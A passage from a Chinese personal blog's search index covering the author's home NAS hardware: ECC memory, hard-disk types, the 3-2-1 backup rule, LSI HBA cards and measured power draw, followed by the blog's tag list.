内存大部分 Intel 家用主板也是可以使用的，二手价格与非 ECC 也差不了多少，所以以后如果有升级服务器主板的打算的话，可以直接买纯 ECC。有些 AMD 主板也支持 REG ECC，因为对 AMD 研究不深所以不做推荐，知道的朋友可以分享一下经验。 硬盘硬盘方案有： 全新 SATA 普通 CMR 西数蓝盘、紫盘、希捷酷鹰：性价比高，如果不要求 7 * 24 开机，推荐选择，但目前能买到的 CMR 家用盘已经越来越少了，只能选监控盘，监控盘适合持续写入，吞吐量没有普通盘高，不在意吞吐量的可以购买。 NAS 专用 CMR 西数红盘、希捷酷狼：注重性能和可靠性，如果对 NAS 的性能要求比较高，需要 7 * 24 小时开机，并且不差钱的，那么推荐选择。 SMR：永远不推荐，除非是有处女情结，只考虑全新，但是手头又不宽裕，或者只把硬盘当光盘一样一次性写入保存冷数据的场景。 二手服务器 SATA：SATA 接口因为比较通用，所以二手市场鱼龙混杂，翻车的几率比较大，不是很推荐。 二手服务器 SAS：一般都是服务器退役下来的，便宜质量还很好，但是一定要组 RAID，或者仅作为非单一副本的冷备使用。商家也要选择比较靠谱的。（参考： https://post.smzdm.com/p/akx4edq8/，https://www.zhihu.com/question/511670585/answer/2311928845） 我的计划是，主要数据用 8 块二手的 SAS 盘组 RAIDZ2/RAID6 存放，然后按照数据集周期性同步至不同的全新 SATA 盘作为冷备，额外几块二手 SAS 盘作为冷备的副本，周期性地运往不同的地域做跨地域备份。 数据备份 321 原则：同一数据至少保留 3 份（包括原数据）；保存到 2 种以上存储介质（比如光盘和硬盘）；至少有 1 份异地备份（本地灾难后还可恢复）。 HBA 直通卡HBA 卡的使用场景： 在家用主板上使用 SAS 硬盘：家用主板是没有 SAS 控制器的，这时候 HBA 卡作为一个 SAS 控制器连接 SAS 硬盘。 扩充硬盘接口：大部分主板只有 4 个 SATA 接口，如果你使用 SATA 盘的数量超过主板提供的接口数量，就可以通过 HBA 卡扩充接口。 抄下淘宝卖家的说明： LSI 9205 9217 9207主控芯片都是SAS2308,性能是一样的！ LSI的主流的直通卡从 2008-2308-3008： LSI 2008 常见型号：DELL H200 H310 / IBM 1115 1015 / LSI 9240 等 LSI 2308 常见型号：LSI 9217/9207 HP 9205 /浪潮超微2308 等 9217=2308 IR模式 9207=2308 IT模式（同级别的 2308卡，IR模式就等于9217 IT模式就等于9207） 性能主要参数对比 6GB直通卡（6GB的直通HBA卡，基本就是基于这两个芯片的） LSI 9211-8i（SAS 2008）PCIe 2.0 533Mhz 处理器 LSI 9207-8i（SAS 2308）PCIe 3.0 800Mhz 处理器 6GB RAID卡（6GB的直RAID卡，基本就是基于这两个芯片的） LSI 9260-8i（SAS 2108）PCIe 2.0 单核 800Mhz 512M DDR2高速缓存 LSI 2308（SAS 2308）PCIe 3.0 双核 800Mhz 512M DDR3高速缓存 LSI SAS2308第2代8端口6Gb/s SAS控制器的模块图，相对于第1代的LSI SAS2008主要的变化是：系统总线接口由PCI Express x8 2.0（5Gb/s）升级为x8 PCIe 3.0（每个lane的速率为8.0Gb/s全双工，实际效率比2.0提升一倍），另外集成的PowerPC 440处理器频率由533MHz提升到800MHz。比DELL H200 IBM M1015（LSI 9211 9200 等）高一个档次。 我选择的是 2008 芯片的 LSI 9211-8i，相对于 2308 发热更小。 装机过程（占位，改日上图） 完成图装好后用了半年才拍的照片，所以有点点灰尘： 顺便晒一下我的两台 Gen8： 还有两台 1L 小主机： 改天再做介绍。 功耗理论功耗 主板：10W CPU：E3 1265L V3，TDP 45W 硬盘：SAS*8，15W*8=120W SAS卡：15W总计：185W 实测功耗 启动峰值功耗：190W 待机功耗：120W 待机功耗（spin down）：42W 工作功耗：150W","link":"/hexo-blog/2022/05/17/%E6%88%91%E7%9A%84%20NAS%20%E6%96%B9%E6%A1%88%EF%BC%88%E7%A1%AC%E4%BB%B6%E7%AF%87%EF%BC%89/"}],"tags":[{"name":"原创","slug":"原创","link":"/hexo-blog/tags/%E5%8E%9F%E5%88%9B/"},{"name":"图像处理","slug":"图像处理","link":"/hexo-blog/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"算法","slug":"算法","link":"/hexo-blog/tags/%E7%AE%97%E6%B3%95/"},{"name":"蚁群算法","slug":"蚁群算法","link":"/hexo-blog/tags/%E8%9A%81%E7%BE%A4%E7%AE%97%E6%B3%95/"},{"name":"爬虫","slug":"爬虫","link":"/hexo-blog/tags/%E7%88%AC%E8%99%AB/"},{"name":"Python","slug":"Python","link":"/hexo-blog/tags/Python/"},{"name":"Linux","slug":"Linux","link":"/hexo-blog/tags/Linux/"},{"name":"Fedora","slug":"Fedora","link":"/hexo-blog/tags/Fedora/"},{"name":"操作系统","slug":"操作系统","link":"/hexo-blog/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"运维","slug":"运维","link":"/hexo-blog/tags/%E8%BF%90%E7%BB%B4/"},{"name":"黑客技术","slug":"黑客技术","link":"/hexo-blog/tags/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/"},{"name":"转载","slug":"转载","link":"/hexo-blog/tags/%E8%BD%AC%E8%BD%BD/"},{"name":"多线程","slug":"多线程","link":"/hexo-blog/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"网络","slug":"网络","link":"/hexo-blog/tags/%E7%BD%91%E7%BB%9C/"},{"name":"树莓派","slug":"树莓派","link":"/hexo-blog/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"},{"name":"Arch Linux","slug":"Arch-Linux","link":"/hexo-blog/tags/Arch-Linux/"},{"name":"Ruby","slug":"Ruby","link":"/hexo-blog/tags/Ruby/"},{"name":"编程语言","slug":"编程语言","link":"/hexo-blog/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"垃圾回收","slug":"垃圾回收","link":"/hexo-blog/tags/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"},{"name":"主板","slug":"主板","link":"/hexo-blog/tags/%E4%B8%BB%E6%9D%BF/"},{"name":"维修","slug":"维修","link":"/hexo-blog/tags/%E7%BB%B4%E4%BF%AE/"},{"name":"硬件","slug":"硬件","link":"/hexo-blog/tags/%E7%A1%AC%E4%BB%B6/"},{"name":"hostapd","slug":"hostapd","link":"/hexo-blog/tags/hostapd/"},{"name":"dnsmasq","slug":"dnsmasq","link":"/hexo-blog/tags/dnsmasq/"},{"name":"Tornado","slug":"Tornado","link":"/hexo-blog/tags/Tornado/"},{"name":"非阻塞","slug":"非阻塞","link":"/hexo-blog/tags/%E9%9D%9E%E9%98%BB%E5%A1%9E/"},{"name":"NIO","slug":"NIO","link":"/hexo-blog/tags/NIO/"},{"name":"云计算","slug":"云计算","link":"/hexo-blog/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"},{"name":"Golang","slug":"Golang","link":"/hexo-blog/tags/Golang/"},{"name":"Docker","slug":"Docker","link":"/hexo-blog/tags/Docker/"},{"name":"PaaS","slug":"PaaS","link":"/hexo-blog/tags/PaaS/"},{"name":"SaaS","slug":"SaaS","link":"/hexo-blog/tags/SaaS/"},{"name":"连连看","slug":"连连看","link":"/hexo-blog/tags/%E8%BF%9E%E8%BF%9E%E7%9C%8B/"},{"name":"游戏","slug":"游戏","link":"/hexo-blog/tags/%E6%B8%B8%E6%88%8F/"},{"name":"DDNS","slug":"DDNS","link":"/hexo-blog/tags/DDNS/"},{"name":"花生壳","slug":"花生壳","link":"/hexo-blog/tags/%E8%8A%B1%E7%94%9F%E5%A3%B3/"},{"name":"摄影","slug":"摄影","link":"/hexo-blog/tags/%E6%91%84%E5%BD%B1/"},{"name":"Power Designer","slug":"Power-Designer","link":"/hexo-blog/tags/Power-Designer/"},{"name":"PostgreSQL","slug":"PostgreSQL","link":"/hexo-blog/tags/PostgreSQL/"},{"name":"Makefile","slug":"Makefile","link":"/hexo-blog/tags/Makefile/"},{"name":"MMap","slug":"MMap","link":"/hexo-blog/tags/MMap/"},{"name":"C","slug":"C","link":"/hexo-blog/tags/C/"},{"name":"协程","slug":"协程","link":"/hexo-blog/tags/%E5%8D%8F%E7%A8%8B/"},{"name":"Git","slug":"Git","link":"/hexo-blog/tags/Git/"},{"name":"闭包","slug":"闭包","link":"/hexo-blog/tags/%E9%97%AD%E5%8C%85/"},{"name":"GC","slug":"GC","link":"/hexo-blog/tags/GC/"},{"name":"Kubernetes","slug":"Kubernetes","link":"/hexo-blog/tags/Kubernetes/"},{"name":"K8S","slug":"K8S","link":"/hexo-blog/tags/K8S/"},{"name":"etcd","slug":"etcd","link":"/hexo-blog/tags/etcd/"},{"name":"HTC","slug":"HTC","link":"/hexo-blog/tags/HTC/"},{"name":"刷机","slug":"刷机","link":"/hexo-blog/tags/%E5%88%B7%E6%9C%BA/"},{"name":"Android","slug":"Android","link":"/hexo-blog/tags/Android/"},{"name":"安卓","slug":"安卓","link":"/hexo-blog/tags/%E5%AE%89%E5%8D%93/"},{"name":"devicemapper","slug":"devicemapper","link":"/hexo-blog/tags/devicemapper/"},{"name":"存储","slug":"存储","link":"/hexo-blog/tags/%E5%AD%98%E5%82%A8/"},{"name":"Openstack","slug":"Openstack","link":"/hexo-blog/tags/Openstack/"},{"name":"terraform","slug":"terraform","link":"/hexo-blog/tags/terraform/"},{"name":"笔记","slug":"笔记","link":"/hexo-blog/tags/%E7%AC%94%E8%AE%B0/"},{"name":"NAS","slug":"NAS","link":"/hexo-blog/tags/NAS/"},{"name":"Windows","slug":"Windows","link":"/hexo-blog/tags/Windows/"},{"name":"Intel","slug":"Intel","link":"/hexo-blog/tags/Intel/"},{"name":"固态硬盘","slug":"固态硬盘","link":"/hexo-blog/tags/%E5%9B%BA%E6%80%81%E7%A1%AC%E7%9B%98/"},{"name":"SSD","slug":"SSD","link":"/hexo-blog/tags/SSD/"},{"name":"Youtube","slug":"Youtube","link":"/hexo-blog/tags/Youtube/"},{"name":"youtube-dl","slug":"youtube-dl","link":"/hexo-blog/tags/youtube-dl/"},{"name":"KVM","slug":"KVM","link":"/hexo-blog/tags/KVM/"},{"name":"虚拟机","slug":"虚拟机","link":"/hexo-blog/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"e2e","slug":"e2e","link":"/hexo-blog/tags/e2e/"},{"name":"机器学习","slug":"机器学习","link":"/hexo-blog/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"人工智能","slug":"人工智能","link":"/hexo-blog/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"Kubelet","slug":"Kubelet","link":"/hexo-blog/tags/Kubelet/"},{"name":"Prometheus","slug":"Prometheus","link":"/hexo-blog/tags/Prometheus/"},{"name":"投资","slug":"投资","link":"/hexo-blog/tags/%E6%8A%95%E8%B5%84/"},{"name":"金融","slug":"金融","link":"/hexo-blog/tags/%E9%87%91%E8%9E%8D/"},{"name":"交易","slug":"交易","link":"/hexo-blog/tags/%E4%BA%A4%E6%98%93/"},{"name":"股票","slug":"股票","link":"/hexo-blog/tags/%E8%82%A1%E7%A5%A8/"},{"name":"期货","slug":"期货","link":"/hexo-blog/tags/%E6%9C%9F%E8%B4%A7/"},{"name":"SRE","slug":"SRE","link":"/hexo-blog/tags/SRE/"},{"name":"读书笔记","slug":"读书笔记","link":"/hexo-blog/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"Google","slug":"Google","link":"/hexo-blog/tags/Google/"}],"categories":[]}